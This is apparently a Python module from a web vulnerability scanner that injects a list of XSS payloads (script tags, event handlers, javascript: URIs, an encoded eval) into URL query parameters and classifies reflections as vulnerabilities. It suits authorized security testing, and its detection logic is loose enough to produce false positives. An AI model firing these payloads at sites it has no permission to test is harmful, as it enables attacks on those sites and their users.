import asyncio
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from utils.http_client import HTTPClient, ClientConfig
from bs4 import BeautifulSoup
import re


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    '<iframe src="javascript:alert(1)">',
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    '<video><source onerror="alert(1)">',
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<svg><a href="javascript:alert(1)">',
    "<script>eval(atob('YWxlcnQoMSk'))</script>",
    "<script>Function('alert(1)')()</script>",
    "javascript:alert(1)",
]


@dataclass
class XSSVulnerability:
    url: str
    payload: str
    type: str
    evidence: str


@dataclass
class XSSResult:
    target: str
    start_time: datetime
    end_time: datetime
    vulnerabilities: list[XSSVulnerability] = field(default_factory=list)
    tested: int = 0
    errors: int = 0
    vulnerable: bool = False
    payload: str = ""


def _check_reflected(html: str, payload: str) -> bool:
    if payload in html:
        return True
    encoded = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    if encoded in html:
        return True
    return False


def _check_dom_xss(html: str) -> bool:
    dangerous_patterns = [
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"\.insertAdjacentHTML",
        r"\.write\(",
        r"document\.cookie",
        r"eval\(",
        r"Function\(",
        r"setTimeout\(",
        r"setInterval\(",
        r"<script[^>]*>",
    ]
    for pattern in dangerous_patterns:
        if re.search(pattern, html, re.IGNORECASE):
            return True
    return False


async def _test_payload(
    client: HTTPClient,
    test_url: str,
    payload: str,
) -> Optional[XSSVulnerability]:
    response = await client.get(test_url)

    if response.error:
        return None

    html = response.body or ""

    if not _check_reflected(html, payload):
        return None

    soup = BeautifulSoup(html, "html.parser")
    scripts = soup.find_all("script")

    for script in scripts:
        script_text = script.string or ""
        if payload in script_text or ("alert" in script_text):
            return XSSVulnerability(
                url=test_url,
                payload=payload,
                type="stored",
                evidence="Script tag with payload executed",
            )

    if "<script" in payload and "<script" in html:
        return XSSVulnerability(
            url=test_url,
            payload=payload,
            type="reflected",
            evidence="Payload reflected in HTML",
        )

    if _check_dom_xss(html):
        return XSSVulnerability(
            url=test_url,
            payload=payload,
            type="dom",
            evidence="DOM XSS sink detected",
        )

    return XSSVulnerability(
        url=test_url,
        payload=payload,
        type="reflected",
        evidence="Payload reflected",
    )


async def detect_xss(
    target: str,
    max_payloads: int = 20,
    threads: int = 5,
) -> XSSResult:
    start_time = datetime.now()
    result = XSSResult(target=target, start_time=start_time, end_time=start_time)

    if "?" not in target or "=" not in target:
        result.end_time = datetime.now()
        return result

    base_url, params = target.split("?", 1)
    param_names = [p.split("=")[0] for p in params.split("&") if "=" in p]

    config = ClientConfig(rate_limit=0.2)
    client = HTTPClient(config)

    vulnerabilities = []
    errors = 0
    tested = 0

    async with client:
        semaphore = asyncio.Semaphore(threads)

        async def limited_test(payload: str) -> Optional[XSSVulnerability]:
            nonlocal errors, tested
            async with semaphore:
                for param in param_names:
                    tested += 1
                    test_url = f"{base_url}?{param}={payload}"
                    vuln = await _test_payload(client, test_url, payload)
                    if vuln:
                        return vuln
                return None

        tasks = [limited_test(p) for p in XSS_PAYLOADS[:max_payloads]]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, XSSVulnerability):
                vulnerabilities.append(r)
            elif isinstance(r, Exception):
                errors += 1

    result.vulnerabilities = vulnerabilities
    result.tested = tested
    result.errors = errors
    result.end_time = datetime.now()

    if vulnerabilities:
        result.vulnerable = True
        result.payload = vulnerabilities[0].payload

    return result
